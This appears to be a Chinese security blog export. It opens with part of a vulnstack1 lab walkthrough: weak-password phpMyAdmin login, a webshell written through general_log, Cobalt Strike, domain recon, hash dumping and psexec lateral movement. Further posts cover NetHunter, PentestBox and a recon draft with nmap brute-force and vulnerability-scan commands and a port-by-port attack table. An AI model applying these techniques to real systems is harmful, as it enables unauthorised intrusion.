<p><img src="//choge.top/2021/02/19/vulnstack1靶机实战/image-20210219154610114.png" alt="image-20210219154610114"></p>
<p>弱口令root/root进入进入phpmyadmin</p>
<p><img src="//choge.top/2021/02/19/vulnstack1靶机实战/image-20210219154635594.png" alt="image-20210219154635594"></p>
<p>phpmyAdmin后台写webshell，且是windows系统，尝试写shell</p>
<p><img src="//choge.top/2021/02/19/vulnstack1靶机实战/image-20210219154803569.png" alt="image-20210219154803569"></p>
<p>secure_file_priv的值为NULL，不能利用写into outfile写木马getshell</p>
<p>修改general_log为on</p>
<p><img src="//choge.top/2021/02/19/vulnstack1靶机实战/image-20210219154825715.png" alt="image-20210219154825715"></p>
<p>执行成功，可以看到路径</p>
<p><img src="//choge.top/2021/02/19/vulnstack1靶机实战/image-20210219154906265.png" alt="image-20210219154906265"></p>
<p>写入shell</p>
<p><img src="//choge.top/2021/02/19/vulnstack1靶机实战/image-20210219160539298.png" alt="image-20210219160539298"></p>
<p>蚁剑连接成功</p>
<p><img src="//choge.top/2021/02/19/vulnstack1靶机实战/image-20210219160558750.png" alt="image-20210219160558750"></p>
<p>生成cobalt strike马上传</p>
<p><img src="//choge.top/2021/02/19/vulnstack1靶机实战/image-20210219160623632.png" alt="image-20210219160623632"></p>
<p>执行cobaltstrike马，上线成功</p>
<p><img src="//choge.top/2021/02/19/vulnstack1靶机实战/image-20210219160649960.png" alt="image-20210219160649960"></p>
<h3 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h3><p>####信息收集</p>
<p>查看是否存在域 <code>ifconfig/all</code></p>
<p><img src="//choge.top/2021/02/19/vulnstack1靶机实战/image-20210219160718328.png" alt="image-20210219160718328"></p>
<p>查看域信息 <code>net view</code></p>
<p><img src="//choge.top/2021/02/19/vulnstack1靶机实战/image-20210219160732355.png" alt="image-20210219160732355"></p>
<p>查看主域信息：<code>net view /domain</code></p>
<p><img src="//choge.top/2021/02/19/vulnstack1靶机实战/image-20210219160812019.png" alt="image-20210219160812019"></p>
<p>查看时间服务器：<code>net time /domain</code></p>
<p>未做进程注入，执行失败</p>
<p><img src="//choge.top/2021/02/19/vulnstack1靶机实战/image-20210219160853237.png" alt="image-20210219160853237"></p>
<p>查询当前的登录域与用户信息：<code>net config workstation</code></p>
<p><img src="//choge.top/2021/02/19/vulnstack1靶机实战/image-20210219160926172.png" alt="image-20210219160926172"></p>
<p>查看当前域的所有用户：<code>net user /domain</code></p>
<p>未做进程注入，执行失败</p>
<p><img src="//choge.top/2021/02/19/vulnstack1靶机实战/image-20210219160944742.png" alt="image-20210219160944742"></p>
<p>获取域内用户的详细信息：<code>wmic useraccount get /all</code></p>
<p>可以获取到用户名，描述信息，SID 域名等</p>
<p><img src="//choge.top/2021/02/19/vulnstack1靶机实战/image-20210219161018172.png" alt="image-20210219161018172"></p>
<p>查看所有域成员计算机列表：<code>net group &quot;domain computers&quot; /domain</code></p>
<p>未做进程注入 执行出错</p>
<p><img src="//choge.top/2021/02/19/vulnstack1靶机实战/image-20210219161041081.png" alt="image-20210219161041081"></p>
<p>查看域管理员：<code>net group &quot;domain admins&quot; /domain</code></p>
<p>未做进程注入执行出错</p>
<p><img src="//choge.top/2021/02/19/vulnstack1靶机实战/image-20210219161103742.png" alt="image-20210219161103742"></p>
<p>获取域密码信息：<code>net accounts /domain</code></p>
<p>未做进程注入执行出错</p>
<p><img src="//choge.top/2021/02/19/vulnstack1靶机实战/image-20210219161320857.png" alt="image-20210219161320857"></p>
<p>获取域信任信息 (cs 里执行提示不是内部或外部命令)：<code>nltest /domain_trusts</code></p>
<p><img src="//choge.top/2021/02/19/vulnstack1靶机实战/image-20210219161338806.png" alt="image-20210219161338806"></p>
<h4 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h4><p>先前<code>net view</code>已经获取过信息</p>
<p><img src="//choge.top/2021/02/19/vulnstack1靶机实战/image-20210219161444240.png" alt="image-20210219161444240"></p>
<p>尝试下主机发现</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">for /L %I in (<span class="number">1</span>,<span class="number">1</span>,<span class="number">254</span>) DO @ping -w <span class="number">1</span> -n <span class="number">1</span> <span class="number">192.168</span><span class="number">.52</span>.%I | findstr <span class="string">"TTL="</span></span><br></pre></td></tr></table></figure>

<p>发现143为本机，发现141主机，感觉此操作不太行</p>
<p><img src="//choge.top/2021/02/19/vulnstack1靶机实战/image-20210219161529145.png" alt="image-20210219161529145"></p>
<p>使用Cobalt strike自带的端口扫描进行探测</p>
<p><img src="//choge.top/2021/02/19/vulnstack1靶机实战/image-20210219161619856.png" alt="image-20210219161619856"></p>
<p>发现138和141且都开启了445端口</p>
<p><img src="//choge.top/2021/02/19/vulnstack1靶机实战/image-20210219161648692.png" alt="image-20210219161648692"></p>
<p>抓取下141的hash</p>
<p><img src="//choge.top/2021/02/19/vulnstack1靶机实战/image-20210219161715474.png" alt="image-20210219161715474"></p>
<p>查看到抓取的密码和hash如下</p>
<p><img src="//choge.top/2021/02/19/vulnstack1靶机实战/image-20210219161738793.png" alt="image-20210219161738793"></p>
<p>尝试使用psexec使138和141上线</p>
<p><img src="//choge.top/2021/02/19/vulnstack1靶机实战/image-20210219161821460.png" alt="image-20210219161821460"></p>
<p><img src="//choge.top/2021/02/19/vulnstack1靶机实战/image-20210219162032313.png" alt="image-20210219162032313"></p>
<p>psexec64不行换成psexec成功，但是并未上线，因为处于内网环境</p>
<p><img src="//choge.top/2021/02/19/vulnstack1靶机实战/image-20210219161933827.png" alt="image-20210219161933827"></p>
<p>cobalt strike建立smb listen上线</p>
<p><img src="//choge.top/2021/02/19/vulnstack1靶机实战/image-20210219162105147.png" alt="image-20210219162105147"></p>
<p>再次使用psexec上线成功</p>
<p><img src="//choge.top/2021/02/19/vulnstack1靶机实战/image-20210219162138461.png" alt="image-20210219162138461"></p>
<p><img src="//choge.top/2021/02/19/vulnstack1靶机实战/image-20210219162148073.png" alt="image-20210219162148073"></p>
<p>同样的方式再次上线另一台</p>
<p><img src="//choge.top/2021/02/19/vulnstack1靶机实战/image-20210219162215665.png" alt="image-20210219162215665"></p>
<p>至此已拿下域控</p>
<p><img src="//choge.top/2021/02/19/vulnstack1靶机实战/image-20210219162230159.png" alt="image-20210219162230159"></p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://v0w.top/2020/07/19/vulnstack1/#psexec-%E4%BD%BF%E7%94%A8%E5%87%AD%E8%AF%81%E7%99%BB%E5%BD%95%E5%85%B6%E4%BB%96%E4%B8%BB%E6%9C%BA" target="_blank" rel="noopener">https://v0w.top/2020/07/19/vulnstack1/#psexec-%E4%BD%BF%E7%94%A8%E5%87%AD%E8%AF%81%E7%99%BB%E5%BD%95%E5%85%B6%E4%BB%96%E4%B8%BB%E6%9C%BA</a></p>
]]></content>
      <categories>
        <category>Penetration test</category>
      </categories>
      <tags>
        <tag>red team</tag>
      </tags>
  </entry>
  <entry>
    <title>nexus5刷kali</title>
    <url>/2020/12/24/NETHUNTER/</url>
    <content><![CDATA[<p>官方网址</p>
<p><a href="https://www.offensive-security.com/kali-linux-nethunter-download/" target="_blank" rel="noopener">https://www.offensive-security.com/kali-linux-nethunter-download/</a></p>
<p>按照自己手机对应下载型号</p>
<p>手机需要做一些准备工作</p>
<p>刷入第三方recovery，见之前教程</p>
<p>将下载的文件导入到手机</p>
<ol>
<li>长按 “手机音量－” ＋ “电源”，先进入fastboot模式，选择Recovery模式，按电源键（多按一会，否则容易直接重启一般模式）；<br>b）点击 INSTALL，选择 nethunter-hammerhead-marshmallow-kalifs-full-2019.4.zip，勾选完成后重启并进行刷入<br>i）刷入完毕后，自动重启，开机画面显示kali图案则为成功</li>
<li>然年进入nethunter app 初始化，最后执行terminal升级！！！</li>
<li>进入terminal后升级顺序，sudo apt-get update, sudo apt-get upgrade, sudo apt-get dist-upgrade, 反复多次</li>
<li>在dist-upgrade 时，提示kismet是否以root身份运行，选择no(因为选yes是不安全的)</li>
</ol>
]]></content>
      <categories>
        <category>Penetration test</category>
      </categories>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>记PentestBox安装</title>
    <url>/2020/12/02/%E8%AE%B0PentestBox%E5%AE%89%E8%A3%85/</url>
    <content><![CDATA[<p>安装后设置环境变量如下：</p><p><img src="//choge.top/2020/12/02/记PentestBox安装/image-20201203102444918.png" alt="image-20201203102444918"></p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="builtin-name">set</span> <span class="attribute">PATH</span>=C:\PentestBox\base\python</span><br><span class="line"><span class="builtin-name">set</span> <span class="attribute">PATH</span>=C:\PentestBox\base\jdk1.8.0_74\bin</span><br><span class="line"><span class="builtin-name">set</span> <span class="attribute">PATH</span>=C:\PentestBox\base\jdk1.8.0_74\jre\bin</span><br><span class="line"><span class="builtin-name">set</span> <span class="attribute">PATH</span>=C:\PentestBox\base\ruby\bin</span><br><span class="line"><span class="builtin-name">set</span> <span class="attribute">PATH</span>=C:\PentestBox\base\curl\bin</span><br><span class="line"><span class="builtin-name">set</span> <span class="attribute">PATH</span>=C:\PentestBox\base\ruby\bin</span><br><span class="line"><span class="builtin-name">set</span> <span class="attribute">PATH</span>=C:\PentestBox\base\get-pip</span><br><span class="line"><span class="builtin-name">set</span> <span class="attribute">PATH</span>=C:\PentestBox\base\PortableGit\bin</span><br><span class="line"><span class="builtin-name">set</span> <span class="attribute">PATH</span>=C:\Windows\System32</span><br><span class="line"><span class="builtin-name">set</span> <span class="attribute">PATH</span>=C:\PentestBox\base\clink</span><br><span class="line"><span class="builtin-name">set</span> <span class="attribute">PATH</span>=C:\PentestBox\base\clink-completions</span><br><span class="line"><span class="builtin-name">set</span> <span class="attribute">PATH</span>=C:\PentestBox\base\conemu-maximus5</span><br><span class="line"><span class="builtin-name">set</span> <span class="attribute">PATH</span>=C:\PentestBox\base\ruby_devkit\bin</span><br><span class="line"><span class="builtin-name">set</span> <span class="attribute">PATH</span>=C:\PentestBox\base\strawberry-perl</span><br></pre></td></tr></table></figure><a id="more"></a>



<p>C:\PentestBox\config\aliases</p>
<p><img src="//choge.top/2020/12/02/记PentestBox安装/image-20201202225419159.png" alt="image-20201202225419159"></p>
<p>使用过程中产生兼容性问题解决如下</p>
<p>如下直接输入sqlmap无法使用，先输入cmd进行加载，然后输入sqlmap即可以使用</p>
<p><img src="//choge.top/2020/12/02/记PentestBox安装/image-20201202225536059.png" alt="image-20201202225536059"></p>
]]></content>
      <categories>
        <category>Penetration test</category>
      </categories>
      <tags>
        <tag>tool</tag>
      </tags>
  </entry>
  <entry>
    <title>外网信息收集（草稿，未完成）</title>
    <url>/2020/11/01/%E5%A4%96%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    <content><![CDATA[<p>渗透的本质是信息收集</p><p>信息收集越全，攻击面就越广，拿下目标的可能性就越大</p><p><a href="https://mp.weixin.qq.com/s/YNp8uKlSSS4be1cOeIIKxQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/YNp8uKlSSS4be1cOeIIKxQ</a></p><h3 id="资产发现"><a href="#资产发现" class="headerlink" title="资产发现"></a>资产发现</h3><h4 id="开源情报"><a href="#开源情报" class="headerlink" title="开源情报"></a>开源情报</h4><h4 id="whois信息查询"><a href="#whois信息查询" class="headerlink" title="whois信息查询"></a>whois信息查询</h4><h4 id="查找真实IP"><a href="#查找真实IP" class="headerlink" title="查找真实IP"></a>查找真实IP</h4><p>ping测试网站</p><p>· <a href="https://wepcc.com/" target="_blank" rel="noopener">https://wepcc.com/</a></p><p>· <a href="http://ping.chinaz.com/" target="_blank" rel="noopener">http://ping.chinaz.com/</a></p><a id="more"></a>





<p>· <a href="http://ping.aizhan.com/" target="_blank" rel="noopener">http://ping.aizhan.com/</a></p>
<h5 id="CDN绕过"><a href="#CDN绕过" class="headerlink" title="CDN绕过"></a>CDN绕过</h5><p><strong>(1)查询子域名：</strong>毕竟 CDN 还是不便宜的，所以很多站长可能只会对主站或者流量大的子站点做了 CDN，而很多小站子站点又跟主站在同一台服务器或者同一个C段内，此时就可以通过查询子域名对应的 IP 来辅助查找网站的真实IP。传送门——&gt; 子域名信息查询</p>
<p><strong>(2)查询主域名</strong>：以前用CDN的时候有个习惯，只让WWW域名使用cdn，秃域名不适用，为的是在维护网站时更方便，不用等cdn缓存。所以试着把目标网站的www去掉，ping一下看ip是不是变了，您别说，这个方法还真是屡用不爽。</p>
<p><strong>(3)邮件服务器：</strong>一般的邮件系统都在内部，没有经过CDN的解析，通过目标网站用户注册或者RSS订阅功能，查看邮件，寻找邮件头中的邮件服务器域名IP，ping这个邮件服务器的域名，就可以获得目标的真实IP(必须是目标自己的邮件服务器，第三方或者公共邮件服务器是没有用的)。</p>
<p><strong>(4)查看域名历史解析记录：</strong>也许目标很久之前没有使用CDN，所以可能会存在使用 CDN 前的记录。所以可以通过网站<a href="https://www.netcraft.com" target="_blank" rel="noopener">https://www.netcraft.com</a> 来观察域名的IP历史记录。</p>
<p><strong>(5)国外访问</strong>：国内的CDN往往只对国内用户的访问加速，而国外的CDN就不一定了。因此，通过国外在线代理网站<a href="https://asm.ca.com/en/ping.php" target="_blank" rel="noopener">https://asm.ca.com/en/ping.php</a> 访问 ，可能会得到真实的ip地址。</p>
<p><strong>(6)Nslookup查询</strong>：查询域名的NS记录、MX记录、TXT记录等很有可能指向的是真实ip或同C段服务器。传送门：各种解析记录</p>
<p><strong>(7)网站漏洞</strong>：利用网站自身存在的漏洞，很多情况下会泄露服务器的真实IP地址</p>
<p><strong>(8)Censys查询SSL证书找到真实IP：</strong>利用“Censys网络空间搜索引擎”搜索网站的SSL证书及HASH，在<a href="https://crt.sh上查找目标网站SSL证书的HASH，然后再用Censys搜索该HASH即可得到真实IP地址" target="_blank" rel="noopener">https://crt.sh上查找目标网站SSL证书的HASH，然后再用Censys搜索该HASH即可得到真实IP地址</a></p>
<p>443.https.tls.certificate.parsed.extensions.subject_alt_name.dns_names:***trade.com</p>
<h5 id="使用IP地址访问"><a href="#使用IP地址访问" class="headerlink" title="使用IP地址访问"></a>使用IP地址访问</h5><p>查找出真实IP地址后，使用真实IP地址和网址绑定写入本地hosts文件就能直接访问</p>
<h4 id="dns"><a href="#dns" class="headerlink" title="dns"></a>dns</h4><h4 id="子域"><a href="#子域" class="headerlink" title="子域"></a>子域</h4><h5 id="Layer子域名爆破工具"><a href="#Layer子域名爆破工具" class="headerlink" title="Layer子域名爆破工具"></a>Layer子域名爆破工具</h5><h5 id="subDomainBrute"><a href="#subDomainBrute" class="headerlink" title="subDomainBrute"></a>subDomainBrute</h5><h5 id="HTTP证书查询"><a href="#HTTP证书查询" class="headerlink" title="HTTP证书查询"></a>HTTP证书查询</h5><p><a href="https://crt.sh" target="_blank" rel="noopener">https://crt.sh</a></p>
<h5 id="Google查询"><a href="#Google查询" class="headerlink" title="Google查询"></a>Google查询</h5><p>Site:baidu.com -www</p>
<h4 id="sublist3r"><a href="#sublist3r" class="headerlink" title="sublist3r"></a>sublist3r</h4><p>python sublist3r.py -d target.com -b -t 50 -o dns.txt</p>
<p><img src="//choge.top/2020/11/01/外网信息收集/image-20201124154612170.png" alt="image-20201124154612170"></p>
<p>将域名解析为ip</p>
<p>for i in `cat dns.txt` ;do host $i|grep -E -o “([0-9]{1,3}[.]{3}[0-9]{1,3})”;done&gt;ips.txt</p>
<p>C段</p>
<p>cat ips.txt |sort|uniq|grep -E -o “([0-9]{1,3}[.])”uniq -c |awk ‘{if ($1&gt;=5) print $2”0/24”}’</p>
<p><a href="https://github.com/FortyNorthSecurity/EyeWitness" target="_blank" rel="noopener">https://github.com/FortyNorthSecurity/EyeWitness</a></p>
<p>11.04.56.png</p>
<p>11.06.13.png</p>
<h5 id="Xray"><a href="#Xray" class="headerlink" title="Xray"></a>Xray</h5><h5 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h5><p>yougestsignal</p>
<p><a href="https://www.yougetsignal.com/" target="_blank" rel="noopener">https://www.yougetsignal.com/</a></p>
<h5 id="自治系统查询"><a href="#自治系统查询" class="headerlink" title="自治系统查询"></a>自治系统查询</h5><p><a href="https://bgp.he.net/" target="_blank" rel="noopener">https://bgp.he.net/</a></p>
<p>渗透一些大型目标时，在目标公司有 AS（自治系统）的情况下可以通过 个运营商来查询目标公司的自治系统号和 CIDR 路由。自治系统分配情況也可以在 IANA 查询到</p>
<p><a href="https://www.iana.org/assignments/as-numbers/as-numbers" target="_blank" rel="noopener">https://www.iana.org/assignments/as-numbers/as-numbers</a>. Xhtml</p>
<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>子域名查询在渗透测试中非常重要，但不同的工具，不同的设备活网络查询出的子域名并不相同，子域名查询建议使用2-3个工具组合使用。</p>
<h4 id="旁站"><a href="#旁站" class="headerlink" title="旁站"></a>旁站</h4><p><a href="http://www.webscan.cc/" target="_blank" rel="noopener">http://www.webscan.cc/</a></p>
<p><a href="http://dns.aizhan.com" target="_blank" rel="noopener">http://dns.aizhan.com</a></p>
<p><a href="http://s.tool.chinaz.com/same" target="_blank" rel="noopener">http://s.tool.chinaz.com/same</a></p>
<h4 id="C段"><a href="#C段" class="headerlink" title="C段"></a>C段</h4><h4 id="网络空间搜索引擎"><a href="#网络空间搜索引擎" class="headerlink" title="网络空间搜索引擎"></a>网络空间搜索引擎</h4><p>shodan</p>
<p><a href="https://nosec.org/home/detail/3713.html" target="_blank" rel="noopener">https://nosec.org/home/detail/3713.html</a></p>
<p>ZoomEye</p>
<p><a href="https://www.zoomeye.org/" target="_blank" rel="noopener">https://www.zoomeye.org/</a></p>
<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><h4 id="域名解析为ip"><a href="#域名解析为ip" class="headerlink" title="域名解析为ip"></a>域名解析为ip</h4><h4 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h4><p>nmap常用语法</p>
<p><a href="https://mp.weixin.qq.com/s?__biz=MzI2NDQyNzg1OA==&amp;mid=2247483849&amp;idx=1&amp;sn=7448559219c08db3913d027064af17da&amp;chksm=eaad81f4ddda08e24435273ce2ce762060197223ca3719a38589299bbe5b3471e36531201380&amp;scene=21#wechat_redirect" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzI2NDQyNzg1OA==&amp;mid=2247483849&amp;idx=1&amp;sn=7448559219c08db3913d027064af17da&amp;chksm=eaad81f4ddda08e24435273ce2ce762060197223ca3719a38589299bbe5b3471e36531201380&amp;scene=21#wechat_redirect</a></p>
<p>nmap -p 1-65535 -T4 -A -v 47.91.163.1-254 -oX 47.91.163.1-254.xml</p>
<p>扫描47.91.163.1-254段IP地址，使用快速扫描模式，输出47.91.163.1-254.xml</p>
<p>nmap -v 47.91.163.1-254</p>
<p>扫描C段常见TCP端口</p>
<p>namp -O 47.91.163.1</p>
<p>探测47.91.163.1服务器OS版本和TCP端口开放情况</p>
<p>nmap -sn 10.0.1.161-166</p>
<p>扫描存活主机 </p>
<p>namp -e eth0 10.0.1.168 -S 10.0.1.168 -Pn</p>
<p>使用伪装地址10.0.1.168对10.0.1.161进行扫描</p>
<p>nmap -iflist</p>
<p>查看本地路由和接口</p>
<p>nmap –script smb-vuln-ms17-010.nse -p 445 192.168.1.1</p>
<p>nmap -script = samba-vuln-cve-2012-1182 -p 139 192.168.1.3</p>
<p>对主机192.168.1.1使用漏洞脚本smb-vuln-ms17-010.nse进行检测</p>
<p>对主机192.168.1.3使用漏洞脚本amba-vuln-cve-2012-1182进行检测</p>
<p>nmap –script whios-domain.nse <a href="http://www.secbang.com" target="_blank" rel="noopener">www.secbang.com</a></p>
<p>获取secbang.com的域名注册情况，该脚本对国外域名支持较好</p>
<p>nmap –script ftp-brute -p 21 127.0.0.1</p>
<p>暴力破解127.0.0.1的ftp账号</p>
<p>nmap -sv -script = http-enum 127.0.0.1</p>
<p>枚举127.0.0.1的目录</p>
<p>nmap-bootstrap.xsl模板将nmap扫描结果转换成HTML格式</p>
<p>nmap -iL ips.txt -sS -T4 -A -sC -oA scanme</p>
<p> xsltproc -o scanme.html nmap-bootstrap.xsl scanme.xml</p>
<ol>
<li>yum install libxslt</li>
</ol>
<p><a href="https://github.com/davidtavarez/WebMap" target="_blank" rel="noopener">https://github.com/davidtavarez/WebMap</a></p>
<table>
<thead>
<tr>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>端口号</td>
<td>端口说明</td>
<td>攻击技巧</td>
</tr>
<tr>
<td>21/22/69</td>
<td>ftp/tftp：文件传输协议</td>
<td>爆破\嗅探\溢出\后门</td>
</tr>
<tr>
<td>22</td>
<td>ssh：远程连接</td>
<td>爆破OpenSSH；28个退格</td>
</tr>
<tr>
<td>23</td>
<td>telnet：远程连接</td>
<td>爆破\嗅探</td>
</tr>
<tr>
<td>25</td>
<td>smtp：邮件服务</td>
<td>邮件伪造</td>
</tr>
<tr>
<td>53</td>
<td>DNS：域名系统</td>
<td>DNS区域传输\DNS劫持\DNS缓存投毒\DNS欺骗\利用DNS隧道技术刺透防火墙</td>
</tr>
<tr>
<td>67/68</td>
<td>dhcp</td>
<td>劫持\欺骗</td>
</tr>
<tr>
<td>110</td>
<td>pop3</td>
<td>爆破</td>
</tr>
<tr>
<td>139</td>
<td>samba</td>
<td>爆破\未授权访问\远程代码执行</td>
</tr>
<tr>
<td>143</td>
<td>imap</td>
<td>爆破</td>
</tr>
<tr>
<td>161</td>
<td>snmp</td>
<td>爆破</td>
</tr>
<tr>
<td>389</td>
<td>ldap</td>
<td>注入攻击\未授权访问</td>
</tr>
<tr>
<td>445</td>
<td>smb</td>
<td>永恒之蓝</td>
</tr>
<tr>
<td>512/513/514</td>
<td>linux r</td>
<td>直接使用rlogin</td>
</tr>
<tr>
<td>873</td>
<td>rsync</td>
<td>未授权访问</td>
</tr>
<tr>
<td>1080</td>
<td>socket</td>
<td>爆破：进行内网渗透</td>
</tr>
<tr>
<td>1352</td>
<td>lotus</td>
<td>爆破：弱口令\信息泄漏：源代码</td>
</tr>
<tr>
<td>1433</td>
<td>mssql</td>
<td>爆破：使用系统用户登录\注入攻击</td>
</tr>
<tr>
<td>1521</td>
<td>oracle</td>
<td>爆破：TNS\注入攻击</td>
</tr>
<tr>
<td>2049</td>
<td>nfs</td>
<td>配置不当</td>
</tr>
<tr>
<td>2181</td>
<td>zookeeper</td>
<td>未授权访问</td>
</tr>
<tr>
<td>3306</td>
<td>mysql</td>
<td>爆破\拒绝服务\注入</td>
</tr>
<tr>
<td>3389</td>
<td>rdp</td>
<td>爆破\Shift后门</td>
</tr>
<tr>
<td>4848</td>
<td>glassfish</td>
<td>爆破：控制台弱口令\认证绕过</td>
</tr>
<tr>
<td>5000</td>
<td>sybase/DB2</td>
<td>爆破\注入</td>
</tr>
<tr>
<td>5432</td>
<td>postgresql</td>
<td>缓冲区溢出\注入攻击\爆破：弱口令</td>
</tr>
<tr>
<td>5632</td>
<td>pcanywhere</td>
<td>拒绝服务\代码执行</td>
</tr>
<tr>
<td>5900</td>
<td>vnc</td>
<td>爆破：弱口令\认证绕过</td>
</tr>
<tr>
<td>6379</td>
<td>redis</td>
<td>未授权访问\爆破：弱口令</td>
</tr>
<tr>
<td>7001</td>
<td>weblogic</td>
<td>Java反序列化\控制台弱口令\控制台部署webshell</td>
</tr>
<tr>
<td>80/443/8080</td>
<td>web</td>
<td>常见web攻击\控制台爆破\对应服务器版本漏洞</td>
</tr>
<tr>
<td>8069</td>
<td>zabbix</td>
<td>远程命令执行</td>
</tr>
<tr>
<td>9090</td>
<td>websphere控制台</td>
<td>爆破：控制台弱口令\Java反序列</td>
</tr>
<tr>
<td>9200/9300</td>
<td>elasticsearch</td>
<td>远程代码执行</td>
</tr>
<tr>
<td>11211</td>
<td>memcacache</td>
<td>未授权访问</td>
</tr>
<tr>
<td>27017</td>
<td>mongodb</td>
<td></td>
</tr>
</tbody></table>
<h4 id="mascan"><a href="#mascan" class="headerlink" title="mascan"></a>mascan</h4><p><a href="https://github.com/robertdavidgraham/masscan" target="_blank" rel="noopener">https://github.com/robertdavidgraham/masscan</a></p>
<p>扫描一个包</p>
<p><img src="//choge.top/2020/11/01/外网信息收集/image-20201121215435309.png" alt="image-20201121215435309"></p>
<p>根据带宽设置速度</p>
<p>Masscan发送一个包是54字节，如果我们每秒钟要发送10w/秒，就需要54*100000/1024/1024=5.14M以上的带宽。通常windows每秒能发25W/秒，linux250W/秒。</p>
<p>mascan </p>
<p><img src="//choge.top/2020/11/01/外网信息收集/image-20201125230216171.png" alt="image-20201125230216171"></p>
<h5 id="EyeWitness"><a href="#EyeWitness" class="headerlink" title="EyeWitness"></a>EyeWitness</h5><p><a href="https://github.com/FortyNorthSecurity/EyeWitness/tree/master" target="_blank" rel="noopener">https://github.com/FortyNorthSecurity/EyeWitness/tree/master</a></p>
<p>其他工具<a href="https://github.com/breenmachine/httpscreenshot" target="_blank" rel="noopener">https://github.com/breenmachine/httpscreenshot</a></p>
<p>kali下</p>
<p>apt-get install xvfb</p>
<p>pip3 install xvfb</p>
<p><a href="https://github.com/mozilla/geckodriver/releases/download/v0.28.0/geckodriver-v0.28.0-linux32.tar.gz" target="_blank" rel="noopener">https://github.com/mozilla/geckodriver/releases/download/v0.28.0/geckodriver-v0.28.0-linux32.tar.gz</a></p>
<p>解压后放入 /usr/local/bin/ 下 chmod +x加入权限</p>
<p>Python EyeWitness.py  -f target.com-dns.txt –web  –add-http-ports 80,81,88,888,2082,2083,3122,4848,6588,7000,7001,7002,7003,8000,8080,8081,8089,8090,8500,8888,9000,9001,9200,9080,10000,10051,50000 –add-https-ports 43,8443,9043</p>
<p><img src="//choge.top/2020/11/01/外网信息收集/image-20201125134156854.png" alt="image-20201125134156854"></p>
<p>前面看到的是用 Eyewitness 解析 DNS.txt，我们也可以直接解析 nmap 的扫描结果</p>
<p>nmap -T4  ip.txt -oX  scan.xml -p 80,81,88,443,888,2082,2083,3122,4848,6588,7000,7001,7002,7003,8000,8080,8081,8089,8090,8443,8500,8888,9000,9001,9200,9043,9080,10000,10051,50000 -Pn –open -n</p>
<p> python EyeWitness.py -x scan.xml –web –no-dns –active-scan</p>
<p>namp解析工具</p>
<p><a href="https://github.com/ilyar/xsltproc" target="_blank" rel="noopener">https://github.com/ilyar/xsltproc</a></p>
<p>nmap解析模版</p>
<p><a href="https://github.com/honze-net/nmap-bootstrap-xsl" target="_blank" rel="noopener">https://github.com/honze-net/nmap-bootstrap-xsl</a></p>
<p>xsltproc -o mt.html nmap-bootstrap.xsl mt.xml</p>
<p><img src="//choge.top/2020/11/01/外网信息收集/image-20201126155323793.png" alt="image-20201126155323793"></p>
<p><a href="https://github.com/Sholway/nmap-parse-output" target="_blank" rel="noopener">https://github.com/Sholway/nmap-parse-output</a></p>
<p><img src="//choge.top/2020/11/01/外网信息收集/image-20201126160435751.png" alt="image-20201126160435751"></p>
<p>./xray_darwin_amd64 webscan –url-file 1.file –html-output web.html</p>
<p>文件格式</p>
<p><a href="http://172.16.49.233:8080/" target="_blank" rel="noopener">http://172.16.49.233:8080/</a><br><a href="http://172.16.49.233:7001/" target="_blank" rel="noopener">http://172.16.49.233:7001/</a></p>
<p><img src="//choge.top/2020/11/01/外网信息收集/image-20201126164228264.png" alt="image-20201126164228264"></p>
<h3 id="资产梳理"><a href="#资产梳理" class="headerlink" title="资产梳理"></a>资产梳理</h3><h4 id="获取网页"><a href="#获取网页" class="headerlink" title="获取网页"></a>获取网页</h4><p>看截图</p>
<h4 id="快速查找漏洞库"><a href="#快速查找漏洞库" class="headerlink" title="快速查找漏洞库"></a>快速查找漏洞库</h4><h3 id="批量漏洞检测"><a href="#批量漏洞检测" class="headerlink" title="批量漏洞检测"></a>批量漏洞检测</h3><p>Web logic</p>
<p><a href="https://github.com/rabbitmask/WeblogicScan" target="_blank" rel="noopener">https://github.com/rabbitmask/WeblogicScan</a>  可扫出漏洞</p>
<p>goby</p>
<p>poc</p>
<p>Strust2</p>
<p>Weblogic</p>
<p><a href="https://github.com/rabbitmask/WeblogicScan" target="_blank" rel="noopener">https://github.com/rabbitmask/WeblogicScan</a></p>
<p>thinkphp5</p>
<p><a href="https://github.com/Mr-xn/Penetration_Testing_POC/tree/master/tp5-getshell" target="_blank" rel="noopener">https://github.com/Mr-xn/Penetration_Testing_POC/tree/master/tp5-getshell</a></p>
<p>汇总</p>
<p><a href="https://github.com/Mr-xn/Penetration_Testing_POC" target="_blank" rel="noopener">https://github.com/Mr-xn/Penetration_Testing_POC</a></p>
<p>K8工具</p>
<p><a href="https://github.com/k8gege/K8tools" target="_blank" rel="noopener">https://github.com/k8gege/K8tools</a></p>
<h3 id="单独站点信息收集"><a href="#单独站点信息收集" class="headerlink" title="单独站点信息收集"></a>单独站点信息收集</h3><p>对网站whois查询看注册人、手机号、邮箱等（可以收集起来放到密码生成工具）；<img src="https://img-blog.csdnimg.cn/20200721111125407.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1a2lub3Jvbmc=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><strong>二、备案号查询</strong></p>
<p>访问<a href="http://www.beianbeian.com/网站" target="_blank" rel="noopener">http://www.beianbeian.com/网站</a></p>
